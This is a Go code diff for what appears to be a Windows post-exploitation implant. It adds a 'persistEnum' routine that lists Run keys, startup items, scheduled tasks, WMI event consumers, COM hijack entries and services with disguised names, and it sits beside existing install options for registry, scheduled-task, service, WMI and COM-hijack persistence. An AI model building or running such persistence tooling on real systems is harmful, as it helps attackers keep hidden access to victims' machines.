@@ -13,6 +13,7 @@ import (
 	"golang.org/x/sys/windows/registry"
 )
 
+
 // persistMethod installs persistence using the given method on Windows.
 // Methods: registry, schtask, startup, service, wmi
 func persistMethod(method, cmd, name string) (string, error) {
@@ -34,8 +35,10 @@ func persistMethod(method, cmd, name string) (string, error) {
 		return comHijackRemove(name)
 	case "rm", "remove", "uninstall":
 		return persistRemove(name)
+	case "enum", "check", "list":
+		return persistEnum()
 	default:
-		return "", fmt.Errorf("unknown persistence method: %s (windows: registry|schtask|startup|service|wmi|comhijack|rm)", method)
+		return "", fmt.Errorf("unknown persistence method: %s (windows: registry|schtask|startup|service|wmi|comhijack|enum|rm)", method)
 	}
 }
 
@@ -158,6 +161,150 @@ func persistWMI(cmd, name string) (string, error) {
 	}
 
 	return fmt.Sprintf("[+] WMI subscription installed: %s", name), nil
+}
+
+// persistEnum checks all known persistence mechanisms and returns a formatted report.
+func persistEnum() (string, error) {
+	var sb strings.Builder
+	sb.WriteString("[*] Scanning persistence mechanisms...\n")
+
+	// HKCU Run
+	sb.WriteString("\n[HKCU Run]\n")
+	if k, err := registry.OpenKey(registry.CURRENT_USER,
+		`Software\Microsoft\Windows\CurrentVersion\Run`,
+		registry.QUERY_VALUE|registry.ENUMERATE_SUB_KEYS); err == nil {
+		defer k.Close()
+		names, _ := k.ReadValueNames(-1)
+		if len(names) == 0 {
+			sb.WriteString("  (empty)\n")
+		}
+		for _, n := range names {
+			v, _, _ := k.GetStringValue(n)
+			fmt.Fprintf(&sb, "  %s = %s\n", n, v)
+		}
+	} else {
+		sb.WriteString("  (error: " + err.Error() + ")\n")
+	}
+
+	// HKLM Run
+	sb.WriteString("\n[HKLM Run]\n")
+	if k, err := registry.OpenKey(registry.LOCAL_MACHINE,
+		`Software\Microsoft\Windows\CurrentVersion\Run`,
+		registry.QUERY_VALUE|registry.ENUMERATE_SUB_KEYS); err == nil {
+		defer k.Close()
+		names, _ := k.ReadValueNames(-1)
+		if len(names) == 0 {
+			sb.WriteString("  (empty)\n")
+		}
+		for _, n := range names {
+			v, _, _ := k.GetStringValue(n)
+			fmt.Fprintf(&sb, "  %s = %s\n", n, v)
+		}
+	} else {
+		sb.WriteString("  (access denied)\n")
+	}
+
+	// Startup folder
+	sb.WriteString("\n[Startup folder]\n")
+	appdata := os.Getenv("APPDATA")
+	startupDir := filepath.Join(appdata, `Microsoft\Windows\Start Menu\Programs\Startup`)
+	if entries, err := os.ReadDir(startupDir); err == nil {
+		found := false
+		for _, e := range entries {
+			if !e.IsDir() {
+				sb.WriteString("  " + e.Name() + "\n")
+				found = true
+			}
+		}
+		if !found {
+			sb.WriteString("  (empty)\n")
+		}
+	} else {
+		sb.WriteString("  (not found)\n")
+	}
+
+	// Scheduled tasks (non-Microsoft)
+	sb.WriteString("\n[Scheduled tasks (non-Microsoft)]\n")
+	sc := exec.Command("schtasks.exe")
+	sc.SysProcAttr = &windows.SysProcAttr{CmdLine: `schtasks.exe /query /fo CSV /nh`, HideWindow: true}
+	taskOut, _ := sc.CombinedOutput()
+	taskCount := 0
+	for _, line := range strings.Split(string(taskOut), "\n") {
+		line = strings.TrimSpace(line)
+		if line == "" || strings.Contains(line, `\Microsoft\`) {
+			continue
+		}
+		parts := strings.SplitN(line, `","`, 3)
+		name := strings.TrimPrefix(parts[0], `"`)
+		status := ""
+		if len(parts) >= 3 {
+			status = strings.TrimSuffix(parts[2], `"`)
+		}
+		fmt.Fprintf(&sb, "  %s [%s]\n", name, status)
+		taskCount++
+	}
+	if taskCount == 0 {
+		sb.WriteString("  (none outside \\Microsoft\\)\n")
+	}
+
+	// WMI subscriptions
+	sb.WriteString("\n[WMI subscriptions]\n")
+	wmiC := exec.Command("cmd.exe", "/C",
+		`wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer get Name,ExecutablePath /format:list 2>&1`)
+	wmiOut, _ := wmiC.CombinedOutput()
+	hasWMI := false
+	for _, l := range strings.Split(string(wmiOut), "\n") {
+		l = strings.TrimSpace(l)
+		if strings.HasPrefix(l, "ExecutablePath=") || strings.HasPrefix(l, "Name=") {
+			sb.WriteString("  " + l + "\n")
+			hasWMI = true
+		}
+	}
+	if !hasWMI {
+		sb.WriteString("  (none)\n")
+	}
+
+	// Services (known suspect names)
+	sb.WriteString("\n[Services (known names)]\n")
+	knownSvcs := []string{"WindowsManagementService", "WindowsUpdate", "MicrosoftEdgeUpdate", "Updater", "MicrosoftUpdateService"}
+	foundSvc := false
+	for _, svcName := range knownSvcs {
+		scq := exec.Command("sc.exe", "query", svcName)
+		scq.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
+		scOut, scErr := scq.CombinedOutput()
+		if scErr == nil && !strings.Contains(string(scOut), "does not exist") {
+			sb.WriteString("  [FOUND] " + svcName + "\n")
+			foundSvc = true
+		}
+	}
+	if !foundSvc {
+		sb.WriteString("  (none of the known names found)\n")
+	}
+
+	// COM hijacking in HKCU\Software\Classes\CLSID
+	sb.WriteString("\n[COM hijacking (HKCU\\Software\\Classes\\CLSID)]\n")
+	if k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Classes\CLSID`, registry.ENUMERATE_SUB_KEYS); err == nil {
+		defer k.Close()
+		clsids, _ := k.ReadSubKeyNames(-1)
+		foundCOM := false
+		for _, clsid := range clsids {
+			ki, err2 := registry.OpenKey(registry.CURRENT_USER,
+				`Software\Classes\CLSID\`+clsid+`\InprocServer32`, registry.QUERY_VALUE)
+			if err2 == nil {
+				v, _, _ := ki.GetStringValue("")
+				ki.Close()
+				fmt.Fprintf(&sb, "  %s => %s\n", clsid, v)
+				foundCOM = true
+			}
+		}
+		if !foundCOM {
+			sb.WriteString("  (none)\n")
+		}
+	} else {
+		sb.WriteString("  (key not found)\n")
+	}
+
+	return sb.String(), nil
 }
 
 // persistRemove attempts to remove the named scheduled task and registry run key.
